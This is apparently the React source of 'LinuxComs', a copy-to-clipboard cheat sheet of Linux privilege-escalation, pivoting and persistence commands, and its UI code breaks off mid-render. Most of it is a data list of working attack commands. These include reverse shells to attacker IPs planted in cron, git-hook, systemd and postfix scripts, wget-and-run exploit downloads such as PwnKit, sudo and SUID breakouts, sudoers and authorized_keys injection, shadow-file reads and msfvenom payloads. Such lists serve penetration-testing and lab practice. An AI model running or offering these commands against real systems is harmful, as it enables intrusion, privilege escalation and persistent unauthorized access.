import React, { useState, useMemo, useEffect } from "react";
import { Copy, Check, Star, Sun, Terminal, Download, Zap } from "lucide-react";

// --- AUTO TOOLS (QUICK INSTALL & RUN) ---
const autoToolsData = [
  {
    id: "t1",
    name: "LinPEAS",
    command:
      "wget http://$target/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh",
  },
  {
    id: "t2",
    name: "LSE (Linux Smart Enum)",
    command:
      "wget http://$target/lse.sh -O lse.sh && chmod +x lse.sh && ./lse.sh -l2",
  },
  {
    id: "t3",
    name: "LinEnum",
    command:
      "wget https://$target/LinEnum.sh -O linenum.sh && chmod +x linenum.sh && ./linenum.sh",
  },
  {
    id: "t4",
    name: "PSPY64 (Process Monitor)",
    command:
      "wget http://$target/pspy64 -O pspy64 && chmod +x pspy64 && timeout 5m ./pspy64",
  },
  {
    id: "t5",
    name: "SUID3NUM",
    command:
      "wget http://$target/suid3num.py -O suid3num.py && chmod +x suid3num.py && python3 suid3num.py",
  },
];

// --- DATA STRUCTURE FROM USER NOTES (110+ Commands) ---
const dummyData = [
  // ---------------------------------
  // SHELL ESCAPES & TTY UPGRADES
  // ---------------------------------
  {
    id: 1,
    description:
      "Upgrade a dumb shell to a fully interactive TTY shell (Python 3).",
    command: `python3 -c 'import pty;pty.spawn("/bin/bash")'\n# Press Ctrl+Z to background the process\nstty raw -echo; fg\nexport TERM=xterm`,
    tags: ["Shell Escape", "Privilege Escalation"],
  },
  {
    id: 2,
    description: "Escape rbash (restricted bash) using the 'ed' editor.",
    command:
      "ed\n!/bin/bash\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH",
    tags: ["Shell Escape", "Privilege Escalation"],
  },
  {
    id: 3,
    description:
      "Preserve effective UID to run a shell as root from an SUID bash binary.",
    command: "/bin/bash -p",
    tags: ["Shell Escape", "SUID", "Privilege Escalation"],
  },

  // ---------------------------------
  // ENUMERATION (OS, KERNEL, USERS)
  // ---------------------------------
  {
    id: 4,
    description: "Check current user identity and assigned groups.",
    command: "id && whoami && groups",
    tags: ["Enumeration"],
  },
  {
    id: 5,
    description: "Check the kernel version and system architecture.",
    command: "uname -a && uname -mrs",
    tags: ["Kernel", "Enumeration"],
  },
  {
    id: 6,
    description: "Check the OS release and distribution information.",
    command: "cat /etc/issue && cat /etc/*-release",
    tags: ["Kernel", "Enumeration"],
  },
  {
    id: 7,
    description: "Find the Linux kernel version specifically from proc.",
    command: "cat /proc/version",
    tags: ["Kernel", "Enumeration"],
  },
  {
    id: 8,
    description: "Query installed RPM kernel packages (RedHat-based).",
    command: "rpm -q kernel",
    tags: ["Kernel", "Enumeration"],
  },
  {
    id: 9,
    description: "List loaded boot files to identify kernel version.",
    command: "ls /boot | grep vmlinuz-",
    tags: ["Kernel", "Enumeration"],
  },
  {
    id: 10,
    description: "List all real users on the box (ignoring false/nologin).",
    command: 'cat /etc/passwd | grep -vE "nologin|false"',
    tags: ["Enumeration"],
  },
  {
    id: 11,
    description: "List all running processes owned by root.",
    command: "ps aux | grep root",
    tags: ["Enumeration"],
  },
  {
    id: 12,
    description:
      "Search the entire file system for SUID binaries, ignoring snap environments.",
    command: "find / -perm -u=s -type f 2>/dev/null | grep -v 'snap'",
    tags: ["SUID", "Enumeration"],
  },
  {
    id: 13,
    description: "Search for SGID files across the entire file system.",
    command: "find / -perm -g=s -type f 2>/dev/null",
    tags: ["SUID", "Enumeration"],
  },
  {
    id: 14,
    description: "Check for binary capabilities (e.g., cap_setuid+ep).",
    command: "getcap -r / 2>/dev/null",
    tags: ["Capabilities", "Enumeration"],
  },
  {
    id: 15,
    description: "Check for world-writable directories to drop payloads.",
    command: "find / -writable -type d 2>/dev/null",
    tags: ["Writable Files", "Enumeration"],
  },

  // ---------------------------------
  // KERNEL & CAPABILITY EXPLOITS
  // ---------------------------------
  {
    id: 16,
    description: "Compile DirtyCow exploit (CVE-2016-5195) in C.",
    command: "gcc -pthread dirty.c -o dirty -lcrypt\n./dirty\nsu toor",
    tags: ["Kernel", "Privilege Escalation"],
  },
  {
    id: 17,
    description:
      "Compile RDS local privilege escalation exploit (Linux 2.6.36).",
    command: "gcc 15285.c -o 15285 -m32",
    tags: ["Kernel", "Privilege Escalation"],
  },
  {
    id: 18,
    description: "Download and execute PwnKit (CVE-2021-4034) exploit.",
    command:
      "wget http://$target/PwnKit -O PwnKit && chmod +x PwnKit && ./PwnKit",
    tags: ["Kernel", "Privilege Escalation"],
  },
  {
    id: 19,
    description: "Exploit python3 if it has cap_setuid capability.",
    command:
      "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash -i\")'",
    tags: ["Capabilities", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 20,
    description: "Exploit python2 if it has cap_setuid capability.",
    command:
      "python2.6 -c 'import os; os.setgid(0);os.setuid(0);os.system(\"/bin/bash\")'",
    tags: ["Capabilities", "Privilege Escalation", "Shell Escape"],
  },

  // ---------------------------------
  // SUDO MISCONFIGURATIONS
  // ---------------------------------
  {
    id: 21,
    description:
      "Check what commands the current user can run as root using sudo.",
    command: "sudo -l",
    tags: ["Sudo", "Enumeration"],
  },
  {
    id: 22,
    description:
      "Switch to a root shell directly if sudo is completely unrestricted.",
    command: "sudo su -",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 23,
    description: "Exploit CVE-2019-14287 (Sudo < 1.8.28) using -1 user ID.",
    command: "sudo -u#-1 id",
    tags: ["Sudo", "Privilege Escalation"],
  },
  {
    id: 24,
    description: "Check for CVE-2021-3156 (Baron Samedit) vulnerability.",
    command: "sudoedit -s /",
    tags: ["Sudo", "Enumeration"],
  },
  {
    id: 25,
    description: "Abuse sudo apache2 to read sensitive files.",
    command: "sudo apache2 -f /etc/shadow",
    tags: ["Sudo", "File Read"],
  },
  {
    id: 26,
    description: "Sudo breakout using find command.",
    command: "sudo find . -exec /bin/sh \\; -quit",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 27,
    description: "Sudo breakout using vim/vi.",
    command: "sudo vim -c ':!/bin/sh'",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 28,
    description: "Sudo breakout using less pager.",
    command: "sudo less /etc/profile\n!/bin/sh",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 29,
    description: "Sudo breakout using awk.",
    command: "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 30,
    description: "Sudo breakout using python.",
    command: "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 31,
    description: "Sudo breakout using perl.",
    command: "sudo perl -e 'exec \"/bin/sh\";'",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 32,
    description: "Sudo breakout using ruby.",
    command: "sudo ruby -e 'exec \"/bin/sh\"'",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 33,
    description: "Sudo breakout using php.",
    command: "sudo php -r \"system('/bin/bash');\"",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 34,
    description: "Sudo breakout using nmap interactive mode.",
    command: "sudo nmap --interactive\nnmap> !sh",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 35,
    description: "Sudo breakout using zip command.",
    command: "sudo zip /tmp/test.zip /tmp/test -T -TT 'sh # '",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 36,
    description: "Sudo breakout using strace.",
    command: "sudo strace -o /dev/null /bin/sh",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 37,
    description: "Sudo breakout using systemctl.",
    command: "sudo systemctl !sh",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 38,
    description: "Sudo breakout using tar checkpoint action.",
    command:
      "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 39,
    description:
      "Sudo LD_PRELOAD abuse to drop root shell from compiled shared object.",
    command: "sudo LD_PRELOAD=/tmp/shell.so <any_allowed_sudo_command>",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 40,
    description: "Sudo LD_LIBRARY_PATH abuse for shared library hijacking.",
    command: "sudo LD_LIBRARY_PATH=/tmp apache2",
    tags: ["Sudo", "Privilege Escalation"],
  },
  {
    id: 41,
    description: "Execute a command as a specific user horizontally via sudo.",
    command: "sudo -u userB /usr/bin/python3 /opt/script.py",
    tags: ["Sudo", "Lateral Movement"],
  },
  {
    id: 42,
    description: "Sudo apt-get update Pre-Invoke breakout.",
    command:
      "sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh",
    tags: ["Sudo", "Privilege Escalation", "Shell Escape"],
  },
  {
    id: 43,
    description: "Sudo composer breakout by injecting a malicious script.",
    command: "sudo composer --working-dir=$TF run-script x",
    tags: ["Sudo", "Privilege Escalation"],
  },
  {
    id: 44,
    description: "Sudo make install breakout via Malicious Makefile.",
    command: "sudo make install -C /home/profiler/php-spx",
    tags: ["Sudo", "Privilege Escalation"],
  },

  // ---------------------------------
  // CRON & SCHEDULED TASKS
  // ---------------------------------
  {
    id: 45,
    description: "Check the system-wide crontab file for scheduled tasks.",
    command: "cat /etc/crontab",
    tags: ["Cron", "Enumeration"],
  },
  {
    id: 46,
    description: "List drop-in cron configuration files.",
    command: "ls -la /etc/cron*",
    tags: ["Cron", "Enumeration"],
  },
  {
    id: 47,
    description: "Check the current user's crontab entries.",
    command: "crontab -l",
    tags: ["Cron", "Enumeration"],
  },
  {
    id: 48,
    description: "Search for cron execution logs in syslog.",
    command: 'grep "CRON" /var/log/syslog',
    tags: ["Cron", "Enumeration"],
  },
  {
    id: 49,
    description:
      "Write reverse shell directly into a world-writable cron script.",
    command: "echo 'nc -e /bin/sh <YOUR_KALI_IP> 4444' >> /opt/cleanup.sh",
    tags: ["Cron", "Writable Files", "File Write", "Privilege Escalation"],
  },
  {
    id: 50,
    description: "Inject SUID bash modification into a cron script.",
    command:
      "echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh",
    tags: ["Cron", "Writable Files", "File Write", "Privilege Escalation"],
  },
  {
    id: 51,
    description: "Create tar wildcard exploit files for cron jobs using tar *.",
    command:
      "echo \"\" > '--checkpoint=1'\necho \"\" > '--checkpoint-action=exec=sh payload.sh'",
    tags: ["Cron", "Writable Files", "File Write", "Privilege Escalation"],
  },
  {
    id: 52,
    description:
      "Abuse apt.conf.d cron jobs by creating a malicious 00rooted Pre-Invoke script.",
    command:
      "echo 'APT::Update::Pre-Invoke {\"chmod +s /bin/bash\"};' > /etc/apt/apt.conf.d/00rooted",
    tags: ["Cron", "Writable Files", "File Write", "Privilege Escalation"],
  },
  {
    id: 53,
    description:
      "Abuse PATH ordering by dropping a malicious binary in /dev/shm.",
    command:
      "echo '#!/bin/bash' > /dev/shm/netstat\necho 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /dev/shm/netstat\nchmod +x /dev/shm/netstat",
    tags: ["Cron", "Writable Files", "File Write", "Privilege Escalation"],
  },

  // ---------------------------------
  // PASSWORD & HASH HUNTING
  // ---------------------------------
  {
    id: 54,
    description:
      "Hunt for passwords recursively in /var/www/, showing filename and line.",
    command:
      "grep -rHns -iE 'password|passwd|pwd|secret|cred' --color=always /var/www/ 2>/dev/null",
    tags: ["Passwords", "Enumeration", "Web"],
  },
  {
    id: 55,
    description:
      "Find config (.cnf) files which often store database passwords.",
    command: 'find / -name "*.cnf" 2>/dev/null',
    tags: ["Passwords", "Database", "Enumeration"],
  },
  {
    id: 56,
    description: "Find environment (.env) files storing sensitive keys.",
    command: 'find / -name "*.env" 2>/dev/null',
    tags: ["Passwords", "Enumeration"],
  },
  {
    id: 57,
    description:
      "Find typical PHP configuration files containing SQL credentials.",
    command: 'find / -name "*config*.php" 2>/dev/null',
    tags: ["Passwords", "Database", "Enumeration", "Web"],
  },
  {
    id: 58,
    description: "Find leftover backup, zip, or tar archives.",
    command:
      'find / -name "*.bak" -o -name "*.zip" -o -name "*.tar.gz" 2>/dev/null',
    tags: ["Passwords", "Enumeration"],
  },
  {
    id: 59,
    description: "Check the current user's bash history for leaked passwords.",
    command: "cat ~/.bash_history",
    tags: ["Passwords", "Enumeration"],
  },
  {
    id: 60,
    description:
      "Monitor active processes dynamically for plaintext passwords passing through.",
    command: 'watch -n 1 "ps -aux | grep pass"',
    tags: ["Passwords", "Enumeration"],
  },
  {
    id: 61,
    description:
      "Sniff localhost traffic to intercept plaintext passwords in transit.",
    command: 'sudo tcpdump -i lo -A | grep "pass"',
    tags: ["Passwords", "Network", "Enumeration"],
  },
  {
    id: 62,
    description: "Generate a custom MD5 shadow hash using OpenSSL.",
    command: "openssl passwd -1 -salt GitRekt pwn1337",
    tags: ["Passwords", "Payload Generation"],
  },
  {
    id: 63,
    description: "Unshadow passwd and shadow files for John the Ripper.",
    command: "unshadow passwd.txt shadow.txt > unshadow.txt",
    tags: ["Passwords", "Enumeration"],
  },
  {
    id: 64,
    description: "Crack unshadowed hash file using John the Ripper.",
    command: "john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt",
    tags: ["Passwords", "Lateral Movement"],
  },
  {
    id: 65,
    description: "Crack SHA-512 ($6$) shadow hashes using Hashcat.",
    command:
      "hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt --force -o cracked",
    tags: ["Passwords", "Lateral Movement"],
  },
  {
    id: 66,
    description:
      "Update ProFTPD backend MySQL database with custom MD5 password.",
    command:
      "update ftpuser set passwd='{md5}X03MO1qnZdYdgyfeuILPmQ==' where id = 1;",
    tags: ["Passwords", "Database", "File Write"],
  },
  {
    id: 67,
    description: "Extract plaintext passwords from Openfire embedded DB logs.",
    command: "grep -i password /var/lib/openfire/embedded-db/openfire.log",
    tags: ["Database", "Passwords", "Enumeration"],
  },

  // ---------------------------------
  // PIVOTING & PORT FORWARDING
  // ---------------------------------
  {
    id: 68,
    description: "Find local listening ports to identify internal services.",
    command:
      "netstat -tulnpe 2>/dev/null || ss -tulnpe 2>/dev/null | grep LISTEN",
    tags: ["Network", "Enumeration"],
  },
  {
    id: 69,
    description: "Ping sweep a /24 subnet using native bash and /dev/tcp.",
    command:
      "for i in {1..254}; do (echo > /dev/tcp/172.16.50.$i/445) >/dev/null 2>&1 && echo $i is open; done",
    tags: ["Network", "Enumeration"],
  },
  {
    id: 70,
    description:
      "Check the local ARP routing table for known internal neighbors.",
    command: "arp -a && ip route",
    tags: ["Network", "Enumeration"],
  },
  {
    id: 71,
    description: "SSH Local Port Forward (-L) a single port to Kali.",
    command:
      "ssh -fN -L 0.0.0.0:4455:172.16.245.217:445 database_admin@10.4.245.215",
    tags: ["Pivoting", "Network", "SSH"],
  },
  {
    id: 72,
    description:
      "SSH Remote Port Forward (-R) a Kali service to the pivot machine.",
    command: "ssh -fN -R 0.0.0.0:3000:127.0.0.1:3000 kali@192.168.45.198",
    tags: ["Pivoting", "Network", "SSH"],
  },
  {
    id: 73,
    description: "SSH Dynamic Port Forward (-D) to create a SOCKS proxy.",
    command: "ssh -N -D 0.0.0.0:9999 database_admin@10.4.245.215",
    tags: ["Pivoting", "Network", "SSH"],
  },
  {
    id: 74,
    description: "Optimize proxychains timeout settings for faster scanning.",
    command:
      "sudo sed -i 's/tcp_read_time_out.*/tcp_read_time_out = 1500/' /etc/proxychains4.conf",
    tags: ["Pivoting", "Network"],
  },
  {
    id: 75,
    description: "Scan an internal network through Proxychains.",
    command:
      "sudo proxychains nmap -sT -Pn -p 4870-4900 -vv --reason 172.16.245.217",
    tags: ["Pivoting", "Network", "Enumeration"],
  },
  {
    id: 76,
    description: "Start a Chisel server on Kali for reverse tunneling.",
    command: "./chisel server --port 8080 --reverse",
    tags: ["Pivoting", "Network"],
  },
  {
    id: 77,
    description:
      "Connect a Chisel client to Kali and setup a reverse SOCKS proxy.",
    command: "./chisel client 192.168.45.198:8080 R:socks",
    tags: ["Pivoting", "Network"],
  },
  {
    id: 78,
    description:
      "Connect a Chisel client to Kali to forward a specific internal port.",
    command: "./chisel client 192.168.45.198:51234 R:4455:172.16.245.217:445",
    tags: ["Pivoting", "Network"],
  },
  {
    id: 79,
    description: "Socat Port Forward (Requires no SSH on the pivot).",
    command: "socat TCP-LISTEN:4455,fork TCP:172.16.245.217:445",
    tags: ["Pivoting", "Network"],
  },
  {
    id: 80,
    description:
      "Netcat FIFO Port Forward (Dirty forward when socat is unavailable).",
    command:
      "mkfifo /tmp/f; nc -l -p 4455 < /tmp/f | nc 172.16.245.217 445 > /tmp/f",
    tags: ["Pivoting", "Network"],
  },
  {
    id: 81,
    description:
      "Use Sshuttle to route a whole /24 subnet over SSH (VPN-like).",
    command: "sshuttle -r database_admin@192.168.195.63:2222 10.4.195.0/24",
    tags: ["Pivoting", "Network", "SSH"],
  },
  {
    id: 82,
    description:
      "Windows Netsh portproxy to forward traffic into a deeper network.",
    command:
      "netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=10.4.245.215",
    tags: ["Pivoting", "Network"],
  },
  {
    id: 83,
    description: "DNS Tunneling server setup using dnscat2.",
    command:
      "dnscat2-server feline.corp\ndnscat2> windows\ndnscat2> window -i 1\ncommand (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445",
    tags: ["Pivoting", "Network"],
  },

  // ---------------------------------
  // DOCKER, LXC, DISK & SSH
  // ---------------------------------
  {
    id: 84,
    description:
      "Mount the host filesystem from inside a privileged Docker container.",
    command: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    tags: ["Docker", "Privilege Escalation"],
  },
  {
    id: 85,
    description: "Import an Alpine image into LXD for container exploitation.",
    command:
      "lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage",
    tags: ["Privilege Escalation"],
  },
  {
    id: 86,
    description:
      "Initialize an LXC container and mount the root host filesystem recursively.",
    command:
      "lxc init myimage mycontainer -c security.privileged=true\nlxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\nlxc start mycontainer\nlxc exec mycontainer /bin/sh",
    tags: ["Privilege Escalation"],
  },
  {
    id: 87,
    description: "Check for mounted filesystems and available disk space.",
    command: "df -h",
    tags: ["Filesystem", "Enumeration"],
  },
  {
    id: 88,
    description:
      "Use debugfs to explore the raw disk partition if in the 'disk' group.",
    command: "debugfs /dev/sda1\ndebugfs: cd /root/.ssh\ndebugfs: cat id_rsa",
    tags: ["Filesystem", "File Read"],
  },
  {
    id: 89,
    description: "Search for private SSH keys across the file system.",
    command: "find / -name id_rsa 2> /dev/null",
    tags: ["SSH", "Enumeration", "Filesystem"],
  },
  {
    id: 90,
    description: "Connect to a target using a recovered SSH private key.",
    command: "chmod 600 id_rsa && ssh -i id_rsa <target_user>@<target_ip>",
    tags: ["SSH", "Lateral Movement"],
  },
  {
    id: 91,
    description:
      "Append your public key to authorized_keys to establish persistence.",
    command:
      'echo "ssh-rsa YOUR_KEY" >> /home/<target_user>/.ssh/authorized_keys',
    tags: ["SSH", "File Write", "Persistence"],
  },

  // ---------------------------------
  // WEB, GIT & PAYLOAD GENERATION
  // ---------------------------------
  {
    id: 92,
    description:
      "Use git-dumper to extract an exposed .git directory from a web server.",
    command: "git-dumper http://bitforge.lab/.git/ website",
    tags: ["Git", "Web", "Lateral Movement"],
  },
  {
    id: 93,
    description: "View the commit history of a recovered Git repository.",
    command: "git log --oneline && git status",
    tags: ["Git", "Enumeration"],
  },
  {
    id: 94,
    description:
      "Exploit git post-checkout hook to gain a shell if root triggers a checkout.",
    command:
      'echo "/bin/bash -i >& /dev/tcp/192.168.45.164/80 0>&1" > .git/hooks/post-checkout\nchmod +x .git/hooks/post-checkout',
    tags: ["Git", "File Write", "Privilege Escalation"],
  },
  {
    id: 95,
    description:
      "Clone an internal Git repository via SSH using a specific private key.",
    command:
      "GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@$target:/git-server",
    tags: ["Git", "Lateral Movement", "SSH"],
  },
  {
    id: 96,
    description:
      "Upload a file to a web application using curl (useful for testing upload bypasses).",
    command:
      'curl -F "myFile=@image.jpg;type=image/jpeg" http://$target/exiftest.php',
    tags: ["Web", "Network", "Payload Generation"],
  },
  {
    id: 97,
    description: "Generate an x64 ASPX reverse shell using msfvenom.",
    command:
      "msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=192.168.45.10 LPORT=443 -o shell-x64.aspx",
    tags: ["Payload Generation", "Web"],
  },
  {
    id: 98,
    description: "List all available payloads in metasploit.",
    command: "msfconsole -l payloads",
    tags: ["Payload Generation"],
  },
  {
    id: 99,
    description:
      "Start a quick Python 3 web server to host files for the victim.",
    command: "python3 -m http.server 80",
    tags: ["Network", "Payload Generation"],
  },
  {
    id: 100,
    description:
      "Start an Impacket SMB server to quickly transfer files to/from clients.",
    command: "impacket-smbserver share . -smb2support",
    tags: ["Network", "Lateral Movement"],
  },
  {
    id: 101,
    description:
      "Add a local DNS resolution to /etc/hosts for routing to internal vhosts.",
    command: 'echo "<Target_IP>   flimsy.com" >> /etc/hosts',
    tags: ["Network", "File Write"],
  },

  // ---------------------------------
  // MISC EXPLOITS & SERVICES
  // ---------------------------------
  {
    id: 102,
    description: "Hijack a Systemd Service by changing its ExecStart path.",
    command:
      "cat << 'EOT' > /etc/systemd/system/spiderbackup.service\n[Unit]\nDescription=Python App\n[Service]\nType=simple\nExecStart=/bin/bash -c 'sleep 15; bash -i >& /dev/tcp/192.168.45.165/445 0>&1'\nUser=root\n[Install]\nWantedBy=multi-user.target\nEOT",
    tags: ["File Write", "Privilege Escalation"],
  },
  {
    id: 103,
    description:
      "Write your user into sudoers using a mounted DosBox vulnerability.",
    command:
      "dosbox -c 'mount c /' -c \"echo commander ALL=(ALL:ALL) NOPASSWD: ALL >> c:\\etc\\sudoers\" -c exit",
    tags: ["File Write", "Privilege Escalation"],
  },
  {
    id: 104,
    description:
      "Exploit an insecure bin_replacer script by dropping a hidden file.",
    command:
      "echo -e '#!/bin/bash\\ncp /bin/bash /tmp/bash\\nchmod +s /tmp/bash' > .ps\n# Wait for cron execution, then:\n/tmp/bash -p",
    tags: ["File Write", "Privilege Escalation"],
  },
  {
    id: 105,
    description:
      "Reverse engineer and exploit a vulnerable .so library (e.g. init_plugin).",
    command:
      "echo -e '#include <stdio.h>\\n#include <stdlib.h>\\nvoid init_plugin() { system(\"chmod u+s /bin/bash\"); }' > libsec.c\ngcc -shared -o libsec.so -fPIC libsec.c",
    tags: ["Payload Generation", "Privilege Escalation"],
  },
  {
    id: 106,
    description:
      "Use string analysis to find hardcoded passwords inside a compiled binary.",
    command: "strings /var/www/html/wordpress/blog/wp-monitor",
    tags: ["Enumeration", "Passwords"],
  },
  {
    id: 107,
    description: "Read root files using Cassandra-Web directory traversal.",
    command:
      "curl localhost:444/../../../../../../../../home/anthony/.ssh/id_rsa --path-as-is -o id_rsa",
    tags: ["File Read", "SSH", "Web"],
  },
  {
    id: 108,
    description: "Hijack an email filter/disclaimer script via postfix.",
    command:
      "echo '#!/bin/bash' > /etc/postfix/disclaimer\necho 'bash -i >& /dev/tcp/192.168.118.5/4444 0>&1' >> /etc/postfix/disclaimer",
    tags: ["Writable Files", "File Write", "Privilege Escalation"],
  },
  {
    id: 109,
    description:
      "Python Module Import Hijacking by shadowing an imported module.",
    command:
      "echo 'import os; os.system(\"chmod u+s /bin/bash\")' > /home/walter/socket.py",
    tags: ["Writable Files", "File Write", "Privilege Escalation"],
  },
  {
    id: 110,
    description:
      "Identify shared objects required by an executable for LD_LIBRARY_PATH exploitation.",
    command: "ldd /usr/sbin/apache2",
    tags: ["Enumeration"],
  },
  {
    id: 111,
    description:
      "Use strace to trace system calls and identify missing files or permission errors.",
    command:
      "strace /var/www/html/wordpress/blog/wp-monitor 2>&1 | grep -iE 'open|access|no such file'",
    tags: ["Enumeration"],
  },
];

// Structured categories
const filterCategories = {
  "What you have:": [
    "Writable Files",
    "Sudo",
    "SUID",
    "Cron",
    "Docker",
    "Capabilities",
    "Passwords",
    "SSH",
    "Web",
    "Git",
  ],
  "Services:": ["Network", "Database", "Filesystem", "Kernel"],
  "Action / Attack Type:": [
    "Enumeration",
    "Privilege Escalation",
    "Lateral Movement",
    "File Write",
    "File Read",
    "Pivoting",
    "Payload Generation",
    "Shell Escape",
    "Persistence",
  ],
};

export default function App() {
  const [searchTerm, setSearchTerm] = useState("");

  // Read tags from URL hash on load
  const getTagsFromHash = () => {
    const hash = window.location.hash.replace(/^#/, "");
    if (!hash) return [];
    return hash.split("+").filter(Boolean).map(decodeURIComponent);
  };

  const [selectedTags, setSelectedTags] = useState(getTagsFromHash());
  const [copiedId, setCopiedId] = useState(null);

  useEffect(() => {
    const handleHashChange = () => {
      setSelectedTags(getTagsFromHash());
    };
    window.addEventListener("hashchange", handleHashChange);
    return () => window.removeEventListener("hashchange", handleHashChange);
  }, []);

  const toggleTag = (tag) => {
    const newTags = selectedTags.includes(tag)
      ? selectedTags.filter((t) => t !== tag)
      : [...selectedTags, tag];

    setSelectedTags(newTags);

    const newHash =
      newTags.length > 0
        ? "#" + newTags.map((t) => "+" + encodeURIComponent(t)).join("")
        : "";

    window.history.pushState(
      null,
      null,
      newHash || window.location.pathname + window.location.search,
    );
  };

  const filteredData = useMemo(() => {
    return dummyData.filter((item) => {
      const matchesTags = selectedTags.every((tag) => item.tags.includes(tag));

      const searchLower = searchTerm.toLowerCase();
      const matchesSearch =
        item.description.toLowerCase().includes(searchLower) ||
        item.command.toLowerCase().includes(searchLower) ||
        item.tags.some((tag) => tag.toLowerCase().includes(searchLower));

      return matchesTags && matchesSearch;
    });
  }, [searchTerm, selectedTags]);

  const handleCopy = (id, command) => {
    navigator.clipboard.writeText(command);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div className="min-h-screen bg-[#2b2d31] text-gray-300 font-sans selection:bg-yellow-500/30">
      <div className="max-w-5xl mx-auto px-6 py-10">
        {/* --- HEADER --- */}
        <header className="flex flex-wrap items-center justify-between gap-4 mb-6">
          <div className="flex items-center gap-4">
            <h1 className="text-4xl font-bold text-gray-100 tracking-tight">
              Linux<span className="text-yellow-500">Coms</span>
            </h1>

            <div className="flex items-center gap-2">
              <button className="flex items-center gap-2 bg-[#1e1f22] border border-gray-600 text-sm px-3 py-1 rounded hover:bg-gray-700 transition-colors">
                <Star size={14} /> Star{" "}
                <span className="font-semibold">1,337</span>
              </button>
              <button className="flex items-center gap-2 bg-[#1e1f22] border border-gray-600 text-sm px-3 py-1 rounded hover:bg-gray-700 transition-colors uppercase font-semibold text-gray-300">
                Daymode <Sun size={14} />
              </button>
            </div>
          </div>
        </header>

        {/* --- INTRO TEXT & LOGO --- */}
        <div className="flex justify-between items-start gap-8 mb-10">
          <div className="space-y-4 text-[15px] leading-relaxed text-gray-400 max-w-3xl">
            <p>
              LinuxComs is an interactive cheat sheet, containing a curated list
              of offensive security tools and their respective commands, to be
              used against Linux environments.
            </p>
            <p>
              If you hate constantly looking up the right command to use to
              escalate privileges (like me), this project should help ease the
              pain a bit. Just select what information you currently have
              related to the Linux machine (SUID binaries, sudo permissions,
              cron jobs, etc.), and it will display a list of tools you can try
              against the machine, along with a template command for easy
              copy/pasting. See the full list of{" "}
              <a href="#" className="text-yellow-500 hover:underline">
                items
              </a>{" "}
              and{" "}
              <a href="#" className="text-yellow-500 hover:underline">
                filters
              </a>
              .
            </p>
          </div>

          <div className="hidden md:flex items-center justify-center w-32 h-32 bg-yellow-500/20 text-yellow-500 rounded-full flex-shrink-0 shadow-lg">
            <Terminal size={64} strokeWidth={1.5} />
          </div>
        </div>

        {/* --- NEW: AUTO TOOLS / QUICK INSTALL LIST --- */}
        <div className="mb-12 bg-[#1e1f22] border border-yellow-500/30 rounded-md overflow-hidden">
          <div className="bg-yellow-500/10 px-4 py-3 border-b border-yellow-500/20 flex items-center gap-2">
            <Zap size={18} className="text-yellow-500" />
            <h3 className="font-bold text-yellow-500 uppercase tracking-wide text-sm">
              Quick Install & Run Tools
            </h3>
          </div>
          <div className="p-4 grid grid-cols-1 md:grid-cols-2 gap-4">
            {autoToolsData.map((tool) => (
              <div key={tool.id} className="flex flex-col gap-1">
                <span className="text-xs font-semibold text-gray-400 flex items-center gap-1">
                  <Download size={12} /> {tool.name}
                </span>
                <div className="relative bg-[#111214] border border-gray-700/50 rounded-sm flex items-stretch group overflow-hidden">
                  <code className="flex-1 p-2 px-3 text-[13px] text-yellow-400/90 font-mono overflow-x-auto whitespace-nowrap hide-scrollbar">
                    {tool.command}
                  </code>
                  <button
                    onClick={() => handleCopy(tool.id, tool.command)}
                    className="px-3 text-gray-500 hover:text-yellow-400 transition-colors border-l border-gray-700/50"
                    title="Copy to clipboard"
                  >
                    {copiedId === tool.id ? (
                      <Check size={16} className="text-green-500" />
                    ) : (
                      <Copy size={16} />
                    )}
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* --- FILTER BUTTONS --- */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-x-8 gap-y-8 mb-10">
          {Object.entries(filterCategories).map(([categoryName, tags]) => (
            <div key={categoryName} className="flex flex-col items-start">
              <h3 className="font-bold text-gray-200 mb-3">{categoryName}</h3>
              <div className="flex flex-wrap justify-start gap-2">
                {tags.map((tag) => {
